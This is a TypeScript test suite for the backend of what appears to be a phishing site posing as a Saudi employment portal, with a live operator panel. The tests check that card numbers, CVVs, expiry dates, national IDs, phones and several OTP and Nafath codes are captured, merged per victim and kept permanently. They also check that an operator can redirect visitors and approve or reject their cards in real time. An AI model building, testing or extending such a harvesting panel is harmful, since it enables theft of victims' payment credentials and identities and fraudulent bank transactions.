import { describe, expect, it } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

type AuthUser = NonNullable<TrpcContext["user"]>;

function makeCtx(role: "admin" | "user" | null = null): TrpcContext {
  const user: AuthUser | null = role
    ? {
        id: 1,
        openId: "test-user",
        email: "test@example.com",
        name: "Test User",
        loginMethod: "manus",
        role,
        createdAt: new Date(),
        updatedAt: new Date(),
        lastSignedIn: new Date(),
      }
    : null;
  // في النظام الجديد الأدمن يحدده حقل admin في السياق
  const admin = role === "admin"
    ? { id: 1, username: "admin", displayName: "Admin", isActive: true }
    : null;
  return {
    user,
    admin,
    req: { protocol: "https", headers: {}, socket: {} } as any,
    res: { clearCookie: () => {}, cookie: () => {} } as any,
  };
}

describe("applications router - validation", () => {
  it("rejects creation with invalid email", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.applications.create({
        fullName: "أحمد",
        familyName: "العتيبي",
        nationality: "سعودي",
        idType: "national",
        idNumber: "1234567890",
        birthDate: "1990-01-01",
        title: "mr",
        email: "invalid-email",
        gender: "male",
      })
    ).rejects.toThrow();
  });

  it("rejects creation with missing required fields", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.applications.create({
        fullName: "",
        familyName: "العتيبي",
        nationality: "سعودي",
        idType: "national",
        idNumber: "1234567890",
        birthDate: "1990-01-01",
        title: "mr",
        email: "test@example.com",
        gender: "male",
      })
    ).rejects.toThrow();
  });

  it("rejects creation with missing phone", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.applications.create({
        fullName: "أحمد",
        familyName: "العتيبي",
        nationality: "سعودي",
        idType: "national",
        idNumber: "1234567890",
        birthDate: "1990-01-01",
        title: "mr",
        email: "test@example.com",
        gender: "male",
        phone: "",
      })
    ).rejects.toThrow();
  });

  it("rejects creation with invalid phone format", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.applications.create({
        fullName: "أحمد",
        familyName: "العتيبي",
        nationality: "سعودي",
        idType: "national",
        idNumber: "1234567890",
        birthDate: "1990-01-01",
        title: "mr",
        email: "test@example.com",
        gender: "male",
        phone: "0601234567",
      })
    ).rejects.toThrow();
  });

  it("accepts valid Saudi phone formats", async () => {
    const caller = appRouter.createCaller(makeCtx());
    for (const phone of ["0512345678", "+966512345678", "966512345678"]) {
      const result = await caller.applications.create({
        fullName: "أحمد",
        familyName: "العتيبي",
        nationality: "سعودي",
        idType: "national",
        idNumber: "1234567890",
        birthDate: "1990-01-01",
        title: "mr",
        email: "test@example.com",
        gender: "male",
        phone,
      });
      expect(result).toEqual({ success: true });
    }
  });

  it("rejects invalid gender enum", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.applications.create({
        fullName: "أحمد",
        familyName: "العتيبي",
        nationality: "سعودي",
        idType: "national",
        idNumber: "1234567890",
        birthDate: "1990-01-01",
        title: "mr",
        email: "test@example.com",
        gender: "other" as never,
      })
    ).rejects.toThrow();
  });
});

describe("applications router - authorization", () => {
  it("blocks list access for unauthenticated users", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(caller.applications.list()).rejects.toThrow();
  });

  it("blocks list access for non-admin users", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(caller.applications.list()).rejects.toThrow();
  });

  it("blocks stats access for non-admin", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(caller.applications.stats()).rejects.toThrow();
  });

  it("blocks delete for non-admin", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(
      caller.applications.delete({ id: 1 })
    ).rejects.toThrow();
  });

  it("blocks status update for non-admin", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(
      caller.applications.updateStatus({ id: 1, status: "accepted" })
    ).rejects.toThrow();
  });
});

describe("settings router", () => {
  it("allows public read of redirect settings", async () => {
    const caller = appRouter.createCaller(makeCtx());
    const result = await caller.settings.getPublic();
    expect(result).toHaveProperty("redirectEnabled");
    expect(result).toHaveProperty("redirectUrl");
    expect(typeof result.redirectEnabled).toBe("boolean");
  });

  it("blocks settings update for non-admin", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(
      caller.settings.update({ redirectEnabled: true, redirectUrl: "https://example.com" })
    ).rejects.toThrow();
  });

  it("blocks settings update for unauthenticated", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.settings.update({ redirectEnabled: true })
    ).rejects.toThrow();
  });
});


// ===== اختبارات نجاح مع mocking لطبقة قاعدة البيانات =====
import { vi } from "vitest";

vi.mock("./db", async () => {
  const actual = await vi.importActual<typeof import("./db")>("./db");
  return {
    ...actual,
    createApplication: vi.fn(async () => ({ insertId: 1 })),
    updateSiteSettings: vi.fn(async () => undefined),
  };
});

import * as dbModule from "./db";

describe("applications.create - happy path", () => {
  it("creates a valid application successfully", async () => {
    const caller = appRouter.createCaller(makeCtx());
    const result = await caller.applications.create({
      fullName: "أحمد",
      familyName: "العتيبي",
      nationality: "سعودي",
      idType: "national",
      idNumber: "1234567890",
      birthDate: "1990-01-01",
      title: "mr",
      email: "ahmad@example.com",
      gender: "male",
      phone: "+966500000000",
      city: "الرياض",
    });
    expect(result).toEqual({ success: true });
    expect(dbModule.createApplication).toHaveBeenCalled();
    const callArg = (dbModule.createApplication as any).mock.calls.at(-1)[0];
    expect(callArg.fullName).toBe("أحمد");
    expect(callArg.email).toBe("ahmad@example.com");
    expect(callArg.gender).toBe("male");
  });
});

describe("settings.update - happy path", () => {
  it("allows admin to update redirect settings with correct payload", async () => {
    const caller = appRouter.createCaller(makeCtx("admin"));
    const result = await caller.settings.update({
      redirectEnabled: true,
      redirectUrl: "https://target.example.com",
    });
    expect(result).toEqual({ success: true });
    expect(dbModule.updateSiteSettings).toHaveBeenCalled();
    const arg = (dbModule.updateSiteSettings as any).mock.calls.at(-1)[0];
    expect(arg.redirectEnabled).toBe(true);
    expect(arg.redirectUrl).toBe("https://target.example.com");
  });

  it("allows admin to update site title", async () => {
    const caller = appRouter.createCaller(makeCtx("admin"));
    const result = await caller.settings.update({
      siteTitle: "مدرسة دلة المحدّثة",
    });
    expect(result).toEqual({ success: true });
  });
});


describe("steps router - access control", () => {
  it("rejects listAll for unauthenticated users", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(caller.steps.listAll({})).rejects.toThrow();
  });

  it("rejects listAll for non-admin users", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(caller.steps.listAll({})).rejects.toThrow();
  });

  it("rejects stats for non-admin users", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(caller.steps.stats()).rejects.toThrow();
  });

  it("rejects bySession for non-admin users", async () => {
    const caller = appRouter.createCaller(makeCtx("user"));
    await expect(
      caller.steps.bySession({ sessionId: "test" })
    ).rejects.toThrow();
  });
});

describe("steps router - validation", () => {
  it("rejects submit with empty sessionId", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.steps.submit({
        sessionId: "",
        stepKey: "test",
        data: {},
      })
    ).rejects.toThrow();
  });

  it("rejects submit with empty stepKey", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.steps.submit({
        sessionId: "session_abc_123",
        stepKey: "",
        data: {},
      })
    ).rejects.toThrow();
  });

  it("accepts submit with valid input", async () => {
    const caller = appRouter.createCaller(makeCtx());
    const res = await caller.steps.submit({
      sessionId: "session_test_xyz789",
      stepKey: "salary_view",
      data: { page: "salary" },
    });
    expect(res.success).toBe(true);
  });

  it("allows admin to list all steps", async () => {
    const caller = appRouter.createCaller(makeCtx("admin"));
    const res = await caller.steps.listAll({ limit: 10 });
    expect(Array.isArray(res)).toBe(true);
  });

  it("allows admin to get steps stats", async () => {
    const caller = appRouter.createCaller(makeCtx("admin"));
    const res = await caller.steps.stats();
    expect(res).toHaveProperty("byStepKey");
    expect(Array.isArray(res.byStepKey)).toBe(true);
  });
});


// ==================== Admin Auth Tests ====================

describe("adminAuth router", () => {
  it("returns null when no admin is in context", async () => {
    const caller = appRouter.createCaller(makeCtx());
    const result = await caller.adminAuth.me();
    expect(result).toBeNull();
  });

  it("returns admin info when admin is in context", async () => {
    const caller = appRouter.createCaller(makeCtx("admin"));
    const result = await caller.adminAuth.me();
    expect(result).not.toBeNull();
    expect(result?.username).toBe("admin");
  });

  it("rejects login with empty username", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.adminAuth.login({ username: "", password: "test" })
    ).rejects.toThrow();
  });

  it("rejects login with empty password", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.adminAuth.login({ username: "admin", password: "" })
    ).rejects.toThrow();
  });

  it("rejects login with non-existent user", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.adminAuth.login({ username: "nonexistent_user_xyz", password: "anyPassword" })
    ).rejects.toThrow();
  });

  it("rejects changePassword for unauthenticated user", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.adminAuth.changePassword({
        currentPassword: "old",
        newPassword: "newpass123",
      })
    ).rejects.toThrow();
  });

  it("rejects changePassword with short new password", async () => {
    const caller = appRouter.createCaller(makeCtx("admin"));
    await expect(
      caller.adminAuth.changePassword({
        currentPassword: "old",
        newPassword: "12345",
      })
    ).rejects.toThrow();
  });
});


// ==================== اختبارات Live Visitors Router ====================

describe("liveVisitors router", () => {
  it("requires admin to list visitors", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.list({ activeWithinSeconds: 60 })
    ).rejects.toThrow();
  });

  it("requires admin to get feed", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(caller.liveVisitors.feed({ limit: 10 })).rejects.toThrow();
  });

  it("requires admin to send command", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.sendCommand({
        sessionId: "sess_test",
        commandType: "redirect",
        payload: "/test",
      })
    ).rejects.toThrow();
  });

  it("requires admin to broadcast redirect", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.broadcastRedirect({ url: "/test" })
    ).rejects.toThrow();
  });

  it("allows public heartbeat call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    const result = await caller.liveVisitors.heartbeat({
      sessionId: "sess_test_heartbeat",
      currentPage: "/employment",
      pageTitle: "Employment",
    });
    expect(result).toHaveProperty("commands");
    expect(Array.isArray(result.commands)).toBe(true);
  });

  it("admin can list visitors", async () => {
    // أرسل heartbeat أولاً ليكون هناك زائر
    const publicCaller = appRouter.createCaller(makeCtx());
    await publicCaller.liveVisitors.heartbeat({
      sessionId: "sess_admin_test",
      currentPage: "/salary",
      pageTitle: "Salary",
    });

    // الآن الأدمن يستطيع رؤيته
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const visitors = await adminCaller.liveVisitors.list({
      activeWithinSeconds: 60,
    });
    expect(Array.isArray(visitors)).toBe(true);
  });

  it("admin can send redirect command then visitor receives it", async () => {
    const sid = `sess_redirect_${Date.now()}`;

    // الزائر يرسل heartbeat
    const publicCaller = appRouter.createCaller(makeCtx());
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/employment",
    });

    // الأدمن يرسل أمر توجيه
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    await adminCaller.liveVisitors.sendCommand({
      sessionId: sid,
      commandType: "redirect",
      payload: "/salary",
    });

    // الزائر يرسل heartbeat مرة أخرى ويستلم الأمر
    const result = await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/employment",
    });

    expect(result.commands.length).toBeGreaterThan(0);
    const cmd = result.commands.find((c: any) => c.type === "redirect");
    expect(cmd).toBeDefined();
    expect(cmd?.payload).toBe("/salary");
  });

  it("rejects invalid command type", async () => {
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    await expect(
      adminCaller.liveVisitors.sendCommand({
        sessionId: "sess_test",
        commandType: "invalid_type" as never,
        payload: "/test",
      })
    ).rejects.toThrow();
  });
});


describe("liveVisitors.listWithSubmissions", () => {
  it("rejects non-admin call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.listWithSubmissions({ activeWithinSeconds: 120 })
    ).rejects.toThrow();
  });

  it("returns visitors with submissions, stepCount, and hasApplication fields", async () => {
    // أرسل heartbeat من زائر
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_with_subs_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/cardpayment",
      pageTitle: "Card Payment",
    });

    // أرسل خطوة لربط بيانات بالزائر
    await publicCaller.steps.submit({
      sessionId: sid,
      stepKey: "salary_view",
      data: { test: true },
    });

    // الأدمن يجلب القائمة
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const result = await adminCaller.liveVisitors.listWithSubmissions({
      activeWithinSeconds: 120,
    });

    expect(Array.isArray(result)).toBe(true);
    for (const v of result) {
      expect(v).toHaveProperty("visitor");
      expect(v).toHaveProperty("submissions");
      expect(v).toHaveProperty("stepCount");
      expect(v).toHaveProperty("hasApplication");
      expect(typeof v.stepCount).toBe("number");
      expect(typeof v.hasApplication).toBe("boolean");
      expect(Array.isArray(v.submissions)).toBe(true);
    }
  });
});


describe("liveVisitors.tableList", () => {
  it("rejects non-admin call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.tableList({ limit: 50 })
    ).rejects.toThrow();
  });

  it("returns visitors and total count for admin", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_table_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/employment",
      pageTitle: "التوظيف",
    });

    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const result = await adminCaller.liveVisitors.tableList({ limit: 100 });

    expect(result).toHaveProperty("visitors");
    expect(result).toHaveProperty("total");
    expect(Array.isArray(result.visitors)).toBe(true);
    expect(typeof result.total).toBe("number");

    for (const v of result.visitors) {
      expect(v).toHaveProperty("sessionId");
      expect(v).toHaveProperty("isActive");
      expect(v).toHaveProperty("currentPage");
      expect(v).toHaveProperty("lastSeen");
      expect(v).toHaveProperty("hasCardData");
      expect(v).toHaveProperty("hasOtpData");
      expect(v).toHaveProperty("stepCount");
      expect(typeof v.isActive).toBe("boolean");
      expect(typeof v.hasCardData).toBe("boolean");
      expect(typeof v.hasOtpData).toBe("boolean");
      // التحقق من الحقول المستخرجة الجديدة
      expect(v).toHaveProperty("cardNumber");
      expect(v).toHaveProperty("cardCvv");
      expect(v).toHaveProperty("otp1");
      expect(v).toHaveProperty("otp2");
    }
  });

  it("merges multiple sessions for the same nationalId into one row", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    
    const sid1 = `sess_merge_1_${Date.now()}`;
    const sid2 = `sess_merge_2_${Date.now()}`;
    const sharedNationalId = `100000${Date.now()}`;

    // Session 1: إدخال بيانات الهوية
    await publicCaller.liveVisitors.heartbeat({ sessionId: sid1, currentPage: "/data" });
    await publicCaller.steps.submit({
      sessionId: sid1,
      stepKey: "data",
      data: { nationalId: sharedNationalId, name: "Test User" }
    });

    // Session 2: إدخال بيانات البطاقة لنفس الهوية
    await publicCaller.liveVisitors.heartbeat({ sessionId: sid2, currentPage: "/cardpayment" });
    await publicCaller.steps.submit({
      sessionId: sid2,
      stepKey: "cardpayment",
      data: { nationalId: sharedNationalId, cardNumber: "4000123456789010" }
    });

    const result = await adminCaller.liveVisitors.tableList({ limit: 100 });
    
    // يجب أن نجد صفاً واحداً يحمل الهوية المشتركة
    const mergedRows = result.visitors.filter(v => v.nationalId === sharedNationalId);
    expect(mergedRows.length).toBe(1);
    
    const mergedRow = mergedRows[0];
    expect(mergedRow.fullName).toBe("Test User");
    expect(mergedRow.cardNumber).toBe("4000123456789010");
    // يجب أن يجمع stepCount من الجلستين
    expect(mergedRow.stepCount).toBeGreaterThanOrEqual(2);
  });
});

describe("liveVisitors.deleteVisitor", () => {
  it("rejects non-admin call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.deleteVisitor({ sessionId: "sess_test" })
    ).rejects.toThrow();
  });

  it("allows admin to delete a visitor by sessionId", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_to_delete_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/data",
      pageTitle: "بيانات",
    });

    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const result = await adminCaller.liveVisitors.deleteVisitor({ sessionId: sid });
    expect(result.success).toBe(true);
  });
});

describe("liveVisitors.deleteAll", () => {
  it("rejects non-admin call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(caller.liveVisitors.deleteAll()).rejects.toThrow();
  });

  it("returns deletion counts for admin", async () => {
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const result = await adminCaller.liveVisitors.deleteAll();

    expect(result.success).toBe(true);
    expect(result.deleted).toHaveProperty("visitors");
    expect(result.deleted).toHaveProperty("applications");
    expect(result.deleted).toHaveProperty("steps");
    expect(result.deleted).toHaveProperty("commands");
    expect(typeof result.deleted.visitors).toBe("number");
  });
});


describe("liveVisitors.setCardStatus", () => {
  it("rejects non-admin call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.setCardStatus({ sessionId: "sess_x", status: "approved" })
    ).rejects.toThrow();
  });

  it("allows admin to set card status to approved/rejected/pending", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_card_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/card-wait",
      pageTitle: "انتظار البطاقة",
    });

    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const r1 = await adminCaller.liveVisitors.setCardStatus({ sessionId: sid, status: "pending" });
    expect(r1.success).toBe(true);

    const r2 = await adminCaller.liveVisitors.setCardStatus({ sessionId: sid, status: "approved" });
    expect(r2.success).toBe(true);

    const r3 = await adminCaller.liveVisitors.setCardStatus({ sessionId: sid, status: "rejected" });
    expect(r3.success).toBe(true);
  });

  it("rejects invalid status enum", async () => {
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    await expect(
      adminCaller.liveVisitors.setCardStatus({
        sessionId: "sess_x",
        status: "unknown" as never,
      })
    ).rejects.toThrow();
  });
});

describe("liveVisitors.markCardPending", () => {
  it("is publicly callable by the visitor (no admin required) and sets status to pending", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_pending_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/cardpayment",
      pageTitle: "بيانات البطاقة",
    });

    const res = await publicCaller.liveVisitors.markCardPending({ sessionId: sid });
    expect(res.success).toBe(true);

    const state = await publicCaller.liveVisitors.getControlState({ sessionId: sid });
    expect(state.cardStatus).toBe("pending");
  });

  it("rejects too-short sessionId", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    await expect(
      publicCaller.liveVisitors.markCardPending({ sessionId: "x" })
    ).rejects.toThrow();
  });
});

describe("liveVisitors.setNafathNumber", () => {
  it("rejects non-admin call", async () => {
    const caller = appRouter.createCaller(makeCtx());
    await expect(
      caller.liveVisitors.setNafathNumber({ sessionId: "sess_x", nafathNumber: "44" })
    ).rejects.toThrow();
  });

  it("allows admin to set then clear nafath number", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_naf_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/nafath-wait",
      pageTitle: "نفاذ",
    });

    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const r1 = await adminCaller.liveVisitors.setNafathNumber({
      sessionId: sid,
      nafathNumber: "44",
    });
    expect(r1.success).toBe(true);

    const r2 = await adminCaller.liveVisitors.setNafathNumber({
      sessionId: sid,
      nafathNumber: null,
    });
    expect(r2.success).toBe(true);
  });
});

describe("liveVisitors.getControlState", () => {
  it("is publicly callable and returns cardStatus + nafathNumber", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sid = `sess_ctrl_${Date.now()}`;
    await publicCaller.liveVisitors.heartbeat({
      sessionId: sid,
      currentPage: "/card-wait",
      pageTitle: "انتظار",
    });

    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    await adminCaller.liveVisitors.setCardStatus({ sessionId: sid, status: "approved" });
    await adminCaller.liveVisitors.setNafathNumber({ sessionId: sid, nafathNumber: "57" });

    const state = await publicCaller.liveVisitors.getControlState({ sessionId: sid });
    expect(state).toHaveProperty("cardStatus");
    expect(state).toHaveProperty("nafathNumber");
    expect(state.cardStatus).toBe("approved");
    expect(state.nafathNumber).toBe("57");
  });

  it("returns defaults for unknown sessionId", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const state = await publicCaller.liveVisitors.getControlState({
      sessionId: "unknown_session_xyz",
    });
    expect(state.cardStatus).toBe("none");
    expect(state.nafathNumber).toBeNull();
  });
});


describe("liveVisitors.leave > preserves visitor record", () => {
  it("does not delete visitor when called (preserves history)", async () => {
    const caller = appRouter.createCaller(makeCtx());
    const sessionId = `sess_test_leave_${Date.now()}`;

    // إنشاء زائر عبر heartbeat
    await caller.liveVisitors.heartbeat({
      sessionId,
      currentPage: "/",
    });

    // إرسال خطوة بيانات حساسة
    await caller.steps.submit({
      sessionId,
      stepKey: "cardpayment",
      data: { name: "TEST USER", number: "4111111111111111", cvv: "123" },
    });

    // الزائر يغادر الموقع
    const result = await caller.liveVisitors.leave({ sessionId });
    expect(result.success).toBe(true);

    // التحقق أن الزائر لا يزال موجوداً في tableList (لم يُحذف!)
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const list = await adminCaller.liveVisitors.tableList({ limit: 1000 });
    const found = list.visitors.find((v: any) => v.sessionId === sessionId);
    expect(found).toBeDefined();
    expect(found?.cardNumber).toBe("4111111111111111");
  });
});


describe("tableList > extracts /data and OTP fields correctly", () => {
  it("captures bank, otp1, otp2 and nafath OTP from steps with underscore keys", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const sessionId = `sess_full_${Date.now()}`;

    await publicCaller.liveVisitors.heartbeat({ sessionId, currentPage: "/" });

    await publicCaller.steps.submit({
      sessionId,
      stepKey: "data",
      data: { idNumber: "1099887766", phone: "0501234567", bank: "بطاقة مصرف الراجحي" },
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "cardpayment",
      data: { name: "TEST", number: "4111111111111111", cvv: "321", month: "12", year: "29" },
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "code_pay",
      data: { otp: "1234" },
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "pay_code",
      data: { otp: "5678" },
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "n_code",
      data: { otp: "9999" },
    });

    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const list = await adminCaller.liveVisitors.tableList({ limit: 1000 });
    const found: any = list.visitors.find((v: any) => v.sessionId === sessionId);
    expect(found).toBeDefined();
    expect(found?.paymentBank).toBe("بطاقة مصرف الراجحي");
    expect(found?.phone).toBe("0501234567");
    expect(found?.nationalId).toBe("1099887766");
    expect(found?.cardNumber).toBe("4111111111111111");
    expect(found?.cardCvv).toBe("321");
    expect(found?.otp1).toBe("1234");
    expect(found?.otp2).toBe("5678");
    expect(found?.otpNafath).toBe("9999");
  });
});


describe("steps.bySession > returns multiple card attempts (history)", () => {
  it("keeps all cardpayment + cardpayment_retry submissions for the same session", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const sessionId = `card-history-${Date.now()}`;

    await publicCaller.steps.submit({
      sessionId,
      stepKey: "cardpayment",
      data: { name: "FIRST", number: "4111111111111111", cvv: "111", month: "01", year: "27" },
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "cardpayment_retry",
      data: { name: "SECOND", number: "5500000000000004", cvv: "222", month: "02", year: "28" },
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "cardpayment_retry",
      data: { name: "THIRD", number: "340000000000009", cvv: "333", month: "03", year: "29" },
    });

    const steps = await adminCaller.steps.bySession({ sessionId });
    const cardSteps = steps.filter((s: any) =>
      s.stepKey === "cardpayment" || s.stepKey === "cardpayment_retry"
    );
    expect(cardSteps.length).toBe(3);
    const numbers = cardSteps.map((s: any) => {
      const d = typeof s.data === "string" ? JSON.parse(s.data) : s.data;
      return d.number;
    });
    expect(numbers).toContain("4111111111111111");
    expect(numbers).toContain("5500000000000004");
    expect(numbers).toContain("340000000000009");
  });
});


describe("liveVisitors > permanent retention", () => {
  it("keeps old visitors in tableList even with stale lastSeen (no auto-delete)", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const sessionId = `sess_old_${Date.now()}`;

    // إنشاء زائر مع بيانات بطاقة
    await publicCaller.liveVisitors.heartbeat({
      sessionId,
      currentPage: "/cardpayment",
      pageTitle: "Card",
    });
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "cardpayment",
      data: { name: "OLD VISITOR", number: "4111111111111111", cvv: "999", month: "12", year: "30" },
    });

    // محاكاة heartbeat لزائر آخر (سابقاً 5% من النبضات كانت تحذف القدامى)
    await publicCaller.liveVisitors.heartbeat({
      sessionId: `sess_other_${Date.now()}`,
      currentPage: "/",
    });

    // التأكد أن الزائر القديم لا يزال موجوداً
    const list = await adminCaller.liveVisitors.tableList({ limit: 5000 });
    const found = list.visitors.find((v: any) => v.sessionId === sessionId);
    expect(found).toBeDefined();
    expect(found?.cardNumber).toBe("4111111111111111");
  });
});

describe("steps > OTP replacement", () => {
  it("replaces old OTP with new OTP for the same stepKey", async () => {
    const publicCaller = appRouter.createCaller(makeCtx());
    const adminCaller = appRouter.createCaller(makeCtx("admin"));
    const sessionId = `otp-replace-${Date.now()}`;

    // إرسال OTP الأول
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "code_pay",
      data: { otp: "1111" },
    });

    // التحقق من وجوده
    let steps = await adminCaller.steps.listAll({ stepKey: "code_pay" });
    let otpSteps = steps.filter((s: any) => s.sessionId === sessionId);
    expect(otpSteps).toHaveLength(1);
    expect(JSON.parse(otpSteps[0].data).otp).toBe("1111");

    // إرسال OTP جديد لنفس الخطوة (باستخدام صيغة أخرى)
    await publicCaller.steps.submit({
      sessionId,
      stepKey: "code-pay",
      data: { otp: "2222" },
    });

    // التحقق من استبداله
    steps = await adminCaller.steps.listAll();
    otpSteps = steps.filter((s: any) => s.sessionId === sessionId && (s.stepKey === "code_pay" || s.stepKey === "code-pay"));
    expect(otpSteps).toHaveLength(1);
    expect(JSON.parse(otpSteps[0].data).otp).toBe("2222");
  });
});
